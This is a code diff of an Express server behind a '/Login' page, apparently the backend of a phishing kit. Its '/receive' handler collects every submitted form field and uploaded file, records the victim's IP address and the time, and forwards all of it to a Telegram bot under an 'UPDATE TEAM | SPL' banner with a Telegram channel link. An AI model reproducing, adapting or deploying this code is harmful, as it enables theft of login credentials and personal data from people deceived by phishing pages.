@@ -147,59 +147,54 @@ app.get('/Login', (req, res) => {
 
 app.post('/receive', (req, res) => {
   if (req.is('multipart/form-data')) {
-    handleMultipartForm(req, res);
+    const form = formidable({ multiples: true });
+
+    form.parse(req, (err, fields, files) => {
+      if (err) {
+        return res.status(500).send('An error occurred while processing the form.');
+      }
+
+      if (!Object.values(fields).some(value => value)) {
+        return res.status(400).send('Form submitted but all fields are empty!');
+      }
+
+      if (files.file && files.file.size > 0) {
+        const filePath = files.file.filepath;
+        const fileName = files.file.originalFilename;
+        const fileType = files.file.mimetype;
+
+        sendFileToTelegram(filePath, fileName, fileType, fields.visitor);
+        return res.json({ status: 'success', message: 'File sent to Telegram.' });
+      }
+
+      res.status(400).send('No valid file provided.');
+    });
+
   } else {
-    handleUrlEncodedOrJson(req, res);
-  }
-});
+    // Handle URL-encoded or JSON data
+    const ipAddress = (req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',')[0].trim();
+    const fields = req.body;
+    let message = `✅ UPDATE TEAM | SPL | USER_${ipAddress}\n\n`;
 
-
-// Function to handle multipart/form-data
-function handleMultipartForm(req, res) {
-  const form = formidable({ multiples: true });
-
-  form.parse(req, (err, fields, files) => {
-    if (err) {
-      return res.status(500).send('An error occurred while processing the form.');
+    // Build the message
+    for (const [key, value] of Object.entries(fields)) {
+      if (key.toLowerCase() !== 'visitor') {
+        message += `${key}: ${value}\n`;
+      }
     }
 
-    if (!Object.values(fields).some(value => value)) {
-      return res.status(400).send('Form submitted but all fields are empty!');
-    }
+    message += `\n🌍 GEO-IP INFO\n` +
+      `IP ADDRESS       : ${ipAddress}\n` +
+      `TIME             : ${new Date().toLocaleString()}\n` +
+      `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    processAndSendData(fields, files, res);
-  });
-}
-
-// Function to handle URL-encoded or JSON data
-function handleUrlEncodedOrJson(req, res) {
-  const fields = req.body;
-  processAndSendData(fields, null, res);
-}
-
-// Common function to process and send data
-function processAndSendData(fields, files, res) {
-  let message = '✅ SPL online\n\n';
-  for (const [key, value] of Object.entries(fields)) {
-    if (key !== 'visitor') {
-      message += `${key}: ${value}\n`;
-    }
-  }
-
-  const userIP = (req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',')[0].trim();
-  message += `🌍 ${userIP}\n`;
-  message += `🕜 ${new Date().toLocaleString()}\n`;
-
-  if (files && files.file && files.file.size > 0) {
-    const { filepath: filePath, originalFilename: fileName, mimetype: fileType } = files.file;
-    sendFileToTelegram(filePath, fileName, fileType, fields.visitor);
-    res.json({ status: 'success', message: 'File sent to Telegram.' });
-  } else {
+    // Send the message to Telegram
     sendMessageToTelegram(message);
+
+    // Respond to the client
     res.json({ status: 'success', message: 'Message sent to Telegram.' });
   }
-}
-
+});
 
 function sendMessageToTelegram(message) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
